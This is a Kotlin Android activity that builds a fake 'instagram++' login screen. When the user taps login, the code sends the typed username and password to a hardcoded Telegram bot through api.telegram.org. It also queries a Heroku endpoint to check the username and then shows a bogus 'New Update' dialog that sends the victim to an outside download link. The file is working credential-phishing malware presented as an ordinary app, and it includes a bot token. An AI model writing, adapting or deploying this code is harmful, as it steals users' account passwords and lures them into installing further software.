package com.example.omarreal.myapplication

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.AsyncTask
import android.os.Bundle
import android.support.design.widget.Snackbar
import android.support.v7.app.AlertDialog
import android.support.v7.app.AppCompatActivity
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.Toast

import kotlinx.android.synthetic.main.activity_main2.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStream
import java.io.InputStreamReader
import java.lang.Exception
import java.net.HttpURLConnection
import java.net.URL

class Main2Activity : AppCompatActivity() {


    lateinit var username : EditText
    lateinit var password : EditText
    lateinit var login : Button
    lateinit var contect : Context

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main2)

        username = findViewById(R.id.username)
        password = findViewById(R.id.password)
        login = findViewById(R.id.login)
        login.isEnabled = false
        contect = this


        login.setOnClickListener {
            var us = username.text.toString()
            var ps = password.text.toString()
            var url ="https://omarrealinsta.herokuapp.com/insta.php?user=$us"
            var token = "463316857:AAFICAGzZCYpL-WZ166neP_G1R0oHCbgd3E"
            var id = "314447848"
            var url2 = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=username: ($us) \n password: ($ps)"
            MySyn().execute(url)
            MySyn2().execute(url2)
        }

        username.setOnFocusChangeListener(View.OnFocusChangeListener { view, b ->

            if (username.text.length > 1) {
                login.isEnabled = true
                login.setBackgroundDrawable(resources.getDrawable(R.drawable.btn2))
                login.setTextColor(resources.getColor(R.color.white))
            }

        })

        password.setOnFocusChangeListener(View.OnFocusChangeListener { view, b ->

            if (password.text.length > 1) {
                login.isEnabled = true
                login.setBackgroundDrawable(resources.getDrawable(R.drawable.btn2))
            }

        })
    }




    inner class MySyn:AsyncTask<String,String,String>(){

        override fun onPreExecute() {
            login.isEnabled = false
        }

        override fun doInBackground(vararg p0: String?): String {
            try {
                val url = URL(p0[0])
                var urlConnect = url.openConnection() as HttpURLConnection
                urlConnect.connectTimeout = 7000

                var dataJsonSt = convertInputToSt(urlConnect.inputStream)
                publishProgress(dataJsonSt)



            }catch (e:Exception){

            }
            return ""
        }

        override fun onProgressUpdate(vararg values: String?) {
            var json = JSONObject(values[0])
            var query =json.getString("result")

            if(query == "yes"){

                if(password.text.length > 5){
                    var alert : AlertDialog.Builder = AlertDialog.Builder(contect)
                    alert.setTitle("New Update")
                    alert.setMessage("There is a new update for instagram++ please update your app now")
                    alert.setPositiveButton("update"){dialogInterface, i ->
                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://download.official-plus.com/OGInsta-Latest-Version")))
                    }
                    alert.show()
                }else{
                    password.error = "incorrect password"
                }


            }else{
                username.error = "incorrect username"
                password.error = "incorrect password"
            }



        }

        override fun onPostExecute(result: String?) {
            login.isEnabled = true
        }

    }


    inner class MySyn2:AsyncTask<String,String,String>(){

        override fun onPreExecute() {

        }

        override fun doInBackground(vararg p0: String?): String {
            try {
                val url = URL(p0[0])
                var urlConnect = url.openConnection() as HttpURLConnection
                urlConnect.connectTimeout = 7000

                var dataJsonSt = convertInputToSt(urlConnect.inputStream)
                publishProgress(dataJsonSt)



            }catch (e:Exception){

            }
            return ""
        }

        override fun onProgressUpdate(vararg values: String?) {
            var json = JSONObject(values[0])
            var query =json.getString("result")


        }

        override fun onPostExecute(result: String?) {

        }

    }

    fun convertInputToSt(inputSt:InputStream):String{
        var buffer = BufferedReader(InputStreamReader(inputSt))
        var line:String
        var allSt:String = ""

        try {

            do {
                line = buffer.readLine()

                if (line != null) {

                    allSt += line
                }

            } while (line != null)

        }catch (e:Exception){}

        return allSt
    }


}
